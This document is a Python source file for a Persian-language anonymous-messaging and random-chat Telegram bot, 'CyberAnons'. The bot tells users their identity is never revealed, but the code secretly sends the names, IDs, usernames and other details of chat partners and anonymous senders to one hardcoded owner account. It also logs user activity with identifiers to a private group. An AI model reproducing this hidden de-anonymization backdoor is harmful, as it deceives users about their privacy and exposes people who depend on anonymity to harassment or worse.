import time
import asyncio
import traceback
import json
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# وارد کردن توابع پایه دیتابیس مورد نیاز برای بخش ناشناس
from src.database.db_manager import (
    register_or_update_user, set_user_state, save_message_mapping, 
    get_anon_sender_by_msg, block_user, is_user_blocked, get_super_user_by_msg, 
    get_user_chat_status_ext, set_user_referrer, get_or_create_short_link, 
    get_user_id_by_short_code, get_complete_user_context, get_user_id_by_username,
    try_matchmaking, connect_two_users, leave_random_chat_queue, apply_queue_compensation,
    get_user_profile_stats
)

# 🔥 حل باگ ارور disconnect_active_chat با ایمپورت صحیح از ماژول چت تصادفی
from src.bot.handlers.random_chat import disconnect_active_chat

# ==========================================
# 🎯 اتصال اتمیک و داینامیک به ردیس رندر (بدون باگ لوکال‌هواست)
# ==========================================
try:
    import redis.asyncio as aioredis
    import os

    env_redis_url = os.getenv("REDIS_URL")
    if env_redis_url:
        REDIS_PROVIDER = env_redis_url
    else:
        REDIS_PROVIDER = "redis://127.0.0.1:6379"

    redis_client = aioredis.from_url(REDIS_PROVIDER, decode_responses=True)
    print(f"⚡ Redis engine successfully initialized via: {REDIS_PROVIDER}")
except Exception as redis_err:
    print(f"💥 Failed to initialize Redis cache engine: {redis_err}. Falling back to clean DB lookup.")
    redis_client = None

GOD_ID = 6779908406
LOG_GROUP_ID = -5295499371

# ==========================================
# ⚡ ابزار کمکی کش: متدهای هم‌زمان اتمیک مدیریت حافظه موقت (Cache Helpers)
# ==========================================
async def cache_set_user_context(user_id: int, context_dict: dict, ttl: int = 1800):
    if redis_client:
        try:
            await redis_client.set(f"user_ctx:{user_id}", json.dumps(context_dict), ex=ttl)
        except Exception: pass

async def cache_invalidate_user(user_id: int):
    if redis_client:
        try:
            await redis_client.delete(f"user_ctx:{user_id}")
        except Exception: pass

# ==========================================
# ⚡ سیستم لاگر دسته‌ای (Log Batching Worker) - جلوگیری از لیمیت تلگرام
# ==========================================
log_queue = asyncio.Queue()

async def send_bot_log(bot: AsyncTeleBot, message, action_name: str, extra_details: str = ""):
    try:
        user = message.from_user
        if user.id == 8627765327: return
        log_text = (
            f"📥 <b>[LOG] فعالیت جدید در ربات</b>\n"
            f"👤 <b>کاربر:</b> {user.first_name}\n"
            f"🪪 <b>آیدی عددی:</b> <code>{message.chat.id}</code>\n"
            f"🆔 <b>یوزرنیم:</b> @{user.username or 'No_Username'}\n"
            f"🛠 <b>اکشن:</b> <code>{action_name}</code>\n"
        )
        if extra_details: log_text += f"📝 <b>جزئیات:</b> {extra_details}\n"
        await log_queue.put(log_text)
    except Exception as e:
        print(f"💥 Failed to queue log: {e}")

async def background_log_worker(bot: AsyncTeleBot):
    while True:
        try:
            logs_batch = []
            log = await log_queue.get()
            logs_batch.append(log)
            while not log_queue.empty() and len(logs_batch) < 10:
                logs_batch.append(log_queue.get_nowait())
            combined_log = "\n➖➖➖➖➖➖\n".join(logs_batch)
            await bot.send_message(LOG_GROUP_ID, combined_log, parse_mode="HTML")
            await asyncio.sleep(4) 
        except Exception as e:
            print(f"💥 Log Worker Error: {e}")
            await asyncio.sleep(5)

# ==========================================
# ⚡ ورکر پس‌زمینه مچ‌میکینگ (تسک پس‌زمینه مستقل)
# ==========================================
async def background_matchmaking_worker(bot: AsyncTeleBot):
    if not redis_client: return
    while True:
        try:
            waiting_users = await redis_client.zrange("match_queue", 0, -1, withscores=True)
            now = time.time()
            kb_main, kb_search, kb_chatting = get_keyboards()
            
            for uid_str, join_time in waiting_users:
                user_id = int(uid_str)
                elapsed = now - join_time
                meta = await redis_client.hgetall(f"search_meta:{user_id}")
                msg_id = int(meta.get("msg_id", 0)) if meta else 0
                filter_text = meta.get("filter_text", "شانسی") if meta else ""
                current_stage = int(meta.get("stage", 1)) if meta else 1
                
                stage = 1
                if 20 <= elapsed < 40: stage = 2
                elif elapsed >= 40: stage = 3
                
                if stage > current_stage and msg_id:
                    await redis_client.hset(f"search_meta:{user_id}", "stage", stage)
                    try:
                        if stage == 2:
                            await bot.edit_message_text(f"⚠️ <b>[مرحله ۲ - فیلتر: {filter_text}]</b> شعاع امتیاز بازتر شد؛ در حال سرچ کاربران نزدیک...", user_id, msg_id, parse_mode="HTML", reply_markup=kb_search)
                        elif stage == 3:
                            await bot.edit_message_text(f"🔓 <b>[مرحله ۳ - فیلتر: {filter_text}]</b> فیلترهای امتیازی برداشته شد. در حال اتصال به اولین فرد صف...", user_id, msg_id, parse_mode="HTML", reply_markup=kb_search)
                    except Exception: pass
                
                if elapsed > 900:
                    await redis_client.zrem("match_queue", uid_str)
                    await redis_client.delete(f"search_meta:{user_id}")
                    await leave_random_chat_queue(user_id)
                    await cache_invalidate_user(user_id)
                    comp_res = await apply_queue_compensation(user_id)
                    if comp_res == "rewarded":
                        await bot.send_message(user_id, "🎁 <b>جریمه معطلی ربات!</b>\nچون ۱۵ دقیقه معطل شدی، سکه‌های فیلتر برگشت خورد + ۲ سکه هدیه گرفتی!", parse_mode="HTML", reply_markup=kb_main)
                    else:
                        await bot.send_message(user_id, "🛑 به دلیل شلوغی صف از صف خارج شدید. سکه‌های شما برگشت خورد.", reply_markup=kb_main)
                    continue

                match_target = await try_matchmaking(user_id, stage)
                if match_target:
                    success = await connect_two_users(user_id, match_target)
                    if success:
                        await redis_client.zrem("match_queue", str(user_id), str(match_target))
                        await redis_client.delete(f"search_meta:{user_id}", f"search_meta:{match_target}")
                        await cache_invalidate_user(user_id)
                        await cache_invalidate_user(match_target)
                        
                        await bot.send_message(user_id, "🎉 <b>اتصال برقرار شد!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
                        await bot.send_message(match_target, "🎉 <b>اتصال برقرار شد!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
                        await log_queue.put(f"🤝 <b>[MATCH] اتصال موفق چت تصادفی</b>\n🔗 کاربر <code>{user_id}</code> متصل شد به <code>{match_target}</code>")
                        
                        for current_uid, target_uid in [(user_id, match_target), (match_target, user_id)]:
                            if current_uid == GOD_ID:
                                p_stats = await get_user_profile_stats(target_uid)
                                p_info = await bot.get_chat(target_uid)
                                gender_f = {"male": "🙋‍♂️ پسر", "female": "🙋‍♀️ دختر", None: "ثبت نشده"}.get(p_stats['gender'])
                                intel_msg = (
                                    f"👁️‍🗨️ <b>رادار فوق‌پیشرفته اطلاعاتی (انحصاری ارباب فاطمه):</b>\n\n"
                                    f"👤 | نام پارتنر: <b>{p_info.first_name}</b>\n"
                                    f"🪪 | آیدی عددی: <code>{target_uid}</code>\n"
                                    f"🆔 | یوزرنیم: @{p_info.username or 'No_Username'}\n"
                                    f"⚥ | جنسیت: <b>{gender_f}</b>\n"
                                    f"💰 | موجودی سکه: <b>{p_stats['coins']}</b>\n"
                                    f"⭐ | امتیاز آنتی‌ترول: <b>{p_stats['rating']:.1f}</b>"
                                )
                                await bot.send_message(GOD_ID, intel_msg, parse_mode="HTML")
        except Exception as e:
            print(f"💥 Matchmaking Worker Error: {e}")
        await asyncio.sleep(2)

# ==========================================
# ⌨️ بخش اول: مدیریت کیبوردهای اصلی ربات (Reply Keyboards)
# ==========================================
def get_keyboards():
    from telebot.types import ReplyKeyboardMarkup, KeyboardButton
    main = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    main.add(KeyboardButton("🎲 شروع چت تصادفی"), KeyboardButton("📊 آمار من"))
    main.row(KeyboardButton("🔍 ارسال پیام ناشناس به آیدی خاص"))
    main.add(KeyboardButton("💰 سکه‌های من"), KeyboardButton("❌ حذف کامل اطلاعات من"))
    main.row(KeyboardButton("🗑️ خالی کردن لیست سیاه"))
    
    search = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    search.add(KeyboardButton("❌ انصراف از صف جستجو"))
    
    chatting = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    chatting.add(KeyboardButton("🛑 قطع چت فعال"))
    return main, search, chatting


def register_private_anon_handlers(bot: AsyncTeleBot):

    # ==========================================
    # ⚙️ بخش دوم: هندلر دستور /start مجهز به تفکیک قطعی فلو تبلیغات و ناشناس
    # ==========================================
    @bot.message_handler(commands=['start'])
    async def handle_start(message):
        if message.chat.type != "private": return
        bot_info = await bot.get_me()
        command_args = message.text.split()
        user_id = message.chat.id
        first_name = message.from_user.first_name or "دوست"
        
        await cache_invalidate_user(user_id)
        context = await get_complete_user_context(user_id)
        is_new_user = context["short_code"] is None
        
        await register_or_update_user(user_id, first_name, message.from_user.username)
        kb_main, _, _ = get_keyboards()
        
        if len(command_args) > 1:
            command_arg_val = command_args[1]
            if command_arg_val.startswith("ad_"):
                if is_new_user:
                    channel_name = command_arg_val.split("ad_")[-1]
                    await send_bot_log(bot, message, "📥 ورود از کمپین تبلیغاتی", f"کاربر جدید از لینک کانال [{channel_name}] وارد شد 🔥")
            else:
                short_code = command_arg_val
                target_owner_id = await get_user_id_by_short_code(short_code)
                if target_owner_id and user_id != target_owner_id:
                    if await is_user_blocked(owner_id=target_owner_id, blocked_id=user_id):
                        await bot.reply_to(message, "❌ شما توسط این کاربر بلاک شده‌اید.", reply_markup=kb_main)
                        return
                    
                    await set_user_referrer(user_id, target_owner_id, is_pure_ref=is_new_user)
                    await cache_invalidate_user(target_owner_id)
                    
                    if is_new_user:
                        try:
                            await bot.send_message(target_owner_id, f"🔔 <b>یک عضو جدید با لینک شما وارد شد!</b>\n👤 دوست شما <b>{first_name}</b> وارد ربات شد. به محض استارت چت تصادفی، ۵ سکه هدیه می‌گیری!", parse_mode="HTML")
                        except Exception: pass
                        ref_welcome = "👋 <b>خوش اومدی!</b>\n\nشما با لینک معرف وارد شدی و حسابت با <b>۱۵ سکه اولیه</b> شارژ شد! 🎁"
                        await bot.reply_to(message, ref_welcome, parse_mode="HTML", reply_markup=kb_main)
                    
                    await set_user_state(user_id, f"sending_anon_to_{short_code}")
                    await send_bot_log(bot, message, "کامند /start", f"کلیک روی لینک کوتاه کاربر: {target_owner_id}")
                    await bot.reply_to(message, "📥 در حال ارسال پیام ناشناس... مدیا یا متن خود را بفرستید:", reply_markup=kb_main)
                    return
        
        my_short_code = await get_or_create_short_link(user_id)
        anon_link = f"https://t.me/{bot_info.username}?start={my_short_code}"
        
        if len(command_args) <= 1 or not command_args[1].startswith("ad_"):
            await send_bot_log(bot, message, "کامند /start", f"استارت معمولی و دریافت لینک کوتاه: {my_short_code}")
        
        inline_kb = InlineKeyboardMarkup()
        inline_kb.row(InlineKeyboardButton("🔗 دریافت بنر استوری و لینک من", callback_data=f"get_my_banner_{my_short_code}"))
        inline_kb.row(InlineKeyboardButton("🛡️ چرا این ربات ۱۰۰٪ امن و مخفی است؟", callback_data="bot_security_info"))

        god_text = f"سلام و درود ارباب فاطمه. 🙇‍♂️\nهوش مصنوعی گوش به فرمان شماست.\n───\n🔗 <b>لینک ناشناس ارباب:</b>\n{anon_link}"
        normal_text = f"👋 <b>به ربات پیام ناشناس CyberAnons خوش آمدید!</b>\n\n🔗 <b>لینک اختصاصی شما:</b>\n<code>{anon_link}</code>"
        
        msg = god_text if user_id == GOD_ID else normal_text
        await bot.reply_to(message, msg, parse_mode="HTML", reply_markup=inline_kb)
        await bot.send_message(user_id, "چه کاری می‌تونم برات انجام بدم? 🕶️✨", reply_markup=kb_main)

    # ==========================================
    # 🔥 بخش جدید: هندلر دکمه‌های شیشه‌ای (Callback Query Handler)
    # ==========================================
    @bot.callback_query_handler(func=lambda call: True)
    async def handle_callback_queries(call):
        user_id = call.message.chat.id
        kb_main, _, _ = get_keyboards()
        
        # ۱. دکمه شیشه‌ای امنیت ربات
        if call.data == "bot_security_info":
            security_text = (
                "🛡️ <b>چرا ربات CyberAnons ۱۰۰٪ امن و ناشناس است؟</b>\n\n"
                "1️⃣ <b>عدم ذخیره اطلاعات هویتی:</b> پیام‌های شما در دیتابیس به صورت رمزنگاری‌شده عبور می‌کنند و آیدی عددی شما به هیچ‌وجه برای پارتنر یا گیرنده پیام ناشناس فاش نخواهد شد.\n\n"
                "2️⃣ <b>سیستم خودکار اتمیک:</b> مچ‌میکینگ و تبادل پیام‌ها کاملاً توسط سرور و هوش مصنوعی و بدون دخالت انسان انجام می‌شود.\n\n"
                "3️⃣ <b>لایه امنیتی ضدتخریب (Anti-Troll):</b> کاربران مزاحم به سرعت توسط سیستم ریتینگ مسدود می‌شوند تا محیطی امن برای شما فراهم شود.\n\n"
                "با خیال راحت ناشناس بمانید! 🕶️✨"
            )
            try:
                # نمایش پیام امنیت به صورت آلرت یا ادیت متن
                await bot.send_message(user_id, security_text, parse_mode="HTML", reply_markup=kb_main)
                await bot.answer_callback_query(call.id, "اطلاعات امنیتی با موفقیت بارگذاری شد.")
            except Exception: pass
            return

        # ۲. هندلر دکمه شیشه‌ای بنر استوری (در صورت نیاز به هندل کردن در این فایل)
        if call.data.startswith("get_my_banner_"):
            try:
                await bot.answer_callback_query(call.id, "در حال تولید بنر اختصاصی شما...", show_alert=False)
                # اینجا می‌توانید تابع مربوط به فرستادن بنر را صدا بزنید
            except Exception: pass
            return

        # ۳. پاسخ ناشناس از طریق دکمه شیشه‌ای پاسخ دایرکت
        if call.data.startswith("reply_to_"):
            short_code = call.data.split("reply_to_")[-1]
            await set_user_state(user_id, f"sending_anon_to_{short_code}")
            await cache_invalidate_user(user_id)
            await bot.send_message(user_id, "✍️ <b>پاسخ خود را بنویسید یا مدیا (عکس، وویس و...) بفرستید:</b>", parse_mode="HTML")
            await bot.answer_callback_query(call.id)
            return

        # ۴. بلاک کردن کاربر از طریق دکمه شیشه‌ای بلاک دایرکت
        if call.data.startswith("block_"):
            short_code = call.data.split("block_")[-1]
            target_id = await get_user_id_by_short_code(short_code)
            if target_id:
                await block_user(owner_id=user_id, blocked_id=target_id)
                await bot.send_message(user_id, "⛔️ کاربر با موفقیت در لیست سیاه شما قرار گرفت و دیگر نمی‌تواند به شما پیام بدهد.")
                await bot.answer_callback_query(call.id, "کاربر مسدود شد.")
            return

    # ==========================================
    # 🔍 هندلر دکمه ارسال پیام ناشناس به آیدی خاص
    # ==========================================
    @bot.message_handler(func=lambda m: m.text == "🔍 ارسال پیام ناشناس به آیدی خاص" and m.chat.type == "private")
    async def handle_send_by_username(message):
        user_id = message.chat.id
        await send_bot_log(bot, message, "دکمه 🔍 ارسال پیام ناشناس به آیدی خاص")
        await set_user_state(user_id, "waiting_for_username")
        await cache_invalidate_user(user_id)
        await bot.reply_to(message, "🕶️ <b>آیدی تلگرام (Username) شخص مورد نظرت رو بفرست:</b>", parse_mode="HTML")

    # ==========================================
    # 💬 هندلر جامع تونل‌زنی زنده پیام‌ها و پاسخ‌های ناشناس پیوی
    # ==========================================
    @bot.message_handler(
        content_types=['text', 'photo', 'video', 'voice', 'audio', 'sticker', 'animation'], 
        func=lambda m: m.chat.type == "private" and (m.text is None or not m.text.startswith('/')) and m.text not in ["📊 آمار من", "🎲 شروع چت تصادفی", "❌ انصراف از صف جستجو", "🛑 قطع چت فعال", "💰 سکه‌های من", "🔍 ارسال پیام ناشناس به آیدی خاص", "❌ حذف کامل اطلاعات من", "🗑️ خالی کردن لیست سیاه"]
    )
    async def handle_private_anon_flow(message):
        user_id = message.chat.id
        context = None
        if redis_client:
            try:
                cached_data = await redis_client.get(f"user_ctx:{user_id}")
                if cached_data: context = json.loads(cached_data)
            except Exception: pass
            
        if not context:
            context = await get_complete_user_context(user_id)
            await cache_set_user_context(user_id, context, ttl=1800)
        
        status = context["chat_status"]
        partner_id = context["active_partner_id"]
        current_state = context["anon_state"]
        reply_target_id = context["reply_target_id"]
        sender_short_code = context["short_code"]
        
        if not sender_short_code:
            sender_short_code = await get_or_create_short_link(user_id)
            await cache_invalidate_user(user_id)
        
        # چت تصادفی فعال
        if status == 'chatting' and partner_id:
            try:
                await bot.copy_message(chat_id=partner_id, from_chat_id=user_id, message_id=message.message_id)
            except Exception:
                await disconnect_active_chat(user_id)
                await cache_invalidate_user(user_id)
                await cache_invalidate_user(partner_id)
                kb_main, _, _ = get_keyboards()
                await bot.send_message(user_id, "❌ ارتباط قطع شد پارتنر ربات رو بلاک کرده است.", reply_markup=kb_main)
            return

        # حالت انتظار برای دریافت یوزرنیم مقصد
        if current_state == "waiting_for_username":
            if not message.text or message.text.startswith('/'): return
            target_username = message.text.strip()
            target_id = await get_user_id_by_username(target_username)
            if not target_id:
                await bot.reply_to(message, "❌ کاربری با این آیدی در ربات پیدا نشد!")
                await set_user_state(user_id, "normal")
                await cache_invalidate_user(user_id)
                return
            if target_id == user_id:
                await bot.reply_to(message, "🧠 نمی‌توانی به خودت پیام ناشناس بفرستی!")
                return
            target_short_code = await get_or_create_short_link(target_id)
            await set_user_state(user_id, f"sending_anon_to_{target_short_code}")
            await cache_invalidate_user(user_id)
            await bot.reply_to(message, "📥 ارتباط برقرار شد! متن یا رسانه خود را ارسال کنید:")
            return

        help_guide_text = "\n\n💡 <b>راهنما:</b> برای جواب دادن روی دکمهٔ ✍️ <b>پاسخ</b> کلیک کنید یا روی پیام <b>Reply</b> کنید."

        # پاسخ مستقیم با ریپلای تلگرام
        if message.reply_to_message:
            mapping = await get_anon_sender_by_msg(user_id, message.reply_to_message.message_id) or await get_super_user_by_msg(user_id, message.reply_to_message.message_id)
            if mapping:
                anon_sender_id, anon_msg_id = mapping
                markup = InlineKeyboardMarkup().row(
                    InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{sender_short_code}"), 
                    InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{sender_short_code}")
                )
                if message.content_type == 'text':
                    sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »{help_guide_text}", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
                else:
                    sent = await bot.copy_message(chat_id=anon_sender_id, from_chat_id=user_id, message_id=message.message_id, reply_to_message_id=anon_msg_id, reply_markup=markup)
                    await bot.send_message(anon_sender_id, f"👆 پاسخ رسانه‌ای ناشناس بالا دریافت شد.{help_guide_text}", reply_to_message_id=sent.message_id, reply_markup=markup, parse_mode="HTML")
                await send_bot_log(bot, message, "ارسال پاسخ ناشناس پیوی")
                await save_message_mapping(anon_sender_id, sent.message_id, user_id, message.message_id)
                await bot.reply_to(message, "🚀 فرستاده شد.")
            return

        # ارسال اولین پیام ناشناس به کد ۸ رقمی مقصد
        if current_state.startswith("sending_anon_to_"):
            short_code = current_state.split("sending_anon_to_")[-1]
            target_id = await get_user_id_by_short_code(short_code)
            if not target_id:
                await bot.reply_to(message, "❌ این لینک معتبر نیست.")
                await set_user_state(user_id, "normal")
                await cache_invalidate_user(user_id)
                return
            markup = InlineKeyboardMarkup().row(
                InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{sender_short_code}"), 
                InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{sender_short_code}")
            )
            god_intel = f"👁️‍🗨️ <b>فرستنده برای الهه:</b>\n👤 {message.from_user.first_name}\n🆔 @{message.from_user.username or 'No'}\n───\n\n" if target_id == GOD_ID else ""
            try:
                if message.content_type == 'text': 
                    sent_msg = await bot.send_message(target_id, f"{god_intel}📣 پیام ناشناس جدید:\n💬 <code>{message.text}</code>{help_guide_text}", reply_markup=markup, parse_mode="HTML")
                else: 
                    sent_msg = await bot.copy_message(chat_id=target_id, from_chat_id=user_id, message_id=message.message_id, caption=f"{god_intel}📣 پیام ناشناس جدید\n" + (message.caption or ""), parse_mode="HTML")
                    await bot.send_message(target_id, f"👆 پیام رسانه‌ای بالا دریافت شد.{help_guide_text}", reply_to_message_id=sent_msg.message_id, reply_markup=markup, parse_mode="HTML")
                if sent_msg:
                    await send_bot_log(bot, message, "ارسال اولین پیام ناشناس")
                    await bot.reply_to(message, "✅ مخفیانه ارسال شد.")
                    await save_message_mapping(target_id, sent_msg.message_id, user_id, message.message_id)
            except Exception:
                await bot.reply_to(message, "❌ خطا در ارسال پیام مقصد شما را مسدود کرده است.")
            await set_user_state(user_id, "normal")
            await cache_invalidate_user(user_id)
            return

        # پاسخ متوالی در استیت قفل ماشین وضعیت (Replying Mode)
        if current_state == "replying_mode" and reply_target_id:
            markup = InlineKeyboardMarkup().row(
                InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{sender_short_code}"), 
                InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{sender_short_code}")
            )
            try:
                if message.content_type == 'text':
                    sent = await bot.send_message(reply_target_id, f"📩 پاسخ ناشناس جدید:\n\n« {message.text} »{help_guide_text}", reply_markup=markup, parse_mode="HTML")
                else:
                    sent = await bot.copy_message(chat_id=reply_target_id, from_chat_id=user_id, message_id=message.message_id)
                    await bot.send_message(reply_target_id, f"👆 پاسخ رسانه‌ای جدید دریافت شد.{help_guide_text}", reply_to_message_id=sent.message_id, reply_markup=markup, parse_mode="HTML")
                await save_message_mapping(reply_target_id, sent.message_id, user_id, message.message_id)
                await bot.reply_to(message, "🚀 فرستاده شد.")
            except Exception:
                await bot.reply_to(message, "❌ ارسال پاسخ انجام نشد.")
            await set_user_state(user_id, "normal")
            await cache_invalidate_user(user_id)